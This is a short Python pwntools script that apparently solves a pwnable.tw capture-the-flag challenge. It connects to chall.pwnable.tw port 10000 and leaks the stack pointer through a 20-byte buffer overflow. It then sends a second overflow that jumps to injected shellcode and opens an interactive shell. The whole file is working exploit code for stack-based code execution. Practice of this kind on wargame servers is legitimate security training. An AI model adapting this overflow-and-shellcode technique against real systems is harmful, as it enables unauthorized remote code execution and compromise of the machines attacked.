from pwn import *

def get_shellcode():
    f = open('shellcode', 'r')
    return f.read()

def get_esp(remote_machine):
    esp_probe = "A" * 20 + p32(0x08048087)
    print remote_machine.recvuntil(':')
    remote_machine.send(esp_probe)
    esp = u32(remote_machine.recv()[:4])
    print hex(esp)
    return esp

if __name__ == "__main__":
    shellcode = get_shellcode()
    context.arch = 'i386'
    remote_machine = remote('chall.pwnable.tw', 10000)
    esp = get_esp(remote_machine)
    payload = "A" * 20 + p32(esp + 20) + shellcode
    remote_machine.send(payload)
    remote_machine.interactive()


